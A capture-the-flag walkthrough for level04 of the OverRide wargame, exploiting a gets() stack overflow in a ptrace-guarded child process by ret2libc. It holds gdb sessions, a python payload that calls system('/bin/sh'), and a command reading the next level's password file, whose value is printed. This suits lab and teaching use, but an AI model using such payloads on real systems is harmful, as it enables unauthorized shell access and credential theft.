# OverRide — Level04 Walkthrough

## Binary Analysis

The binary uses a parent/child model:

- the child process calls `gets()` on a 32-byte buffer,
- the parent monitors the child with `ptrace()`,
- if the child reaches syscall `11` (`execve`), the parent kills it.

Decompiled code:

```c
int	main(int c, char **argv)
{
	pid_t	ach;
	char	s[32];
	int32_t	v = 0;
	long	wstatus = 0;

	ach = fork();
	memset(s, 0, 32);

	if (!ach)
	{
		prctl(PR_SET_PDEATHSIG, SIGHUP);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(s);
		return 0;
	}

	while (1)
	{
		wait(wstatus);
		if (wstatus == 127 || 0xff & ((wstatus & 127) + 1) >> 1 <= 0)
		{
			puts("child is exiting...");
			return 0;
		}
		v = ptrace(PTRACE_PEEKUSER, ach, 44, 0);
		if (v == 11)
		{
			puts("no exec() for you");
			kill(ach, 9);
			return 0;
		}
	}

	return 0;
}
```

## Vulnerability

`gets()` is unsafe and allows a stack buffer overflow.

Even with the `execve` anti-shellcode check, we can use a ret2libc payload and call `system("/bin/sh")`.

## Exploitation

### Step 1: Find the offset

Because the target input is in the child process, follow the child in `gdb`:

```bash
(gdb) set follow-fork-mode child
```

Then crash with a cyclic pattern:

```bash
level04@OverRide:~$ gdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 3736]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3736]
0x41326641 in ?? ()
```

Offset found: **156** bytes.

### Step 2: Resolve ret2libc targets

Get `system()` address:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Get libc range:

```bash
(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6
```

Find `"/bin/sh"` in libc:

```bash
(gdb) find 0xf7e42f70, +99999999, "/bin/sh"
0xf7f897ec
```

### Step 3: Build and run payload

```bash
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## Result

Successfully gained access as `level05` and recovered the next level password.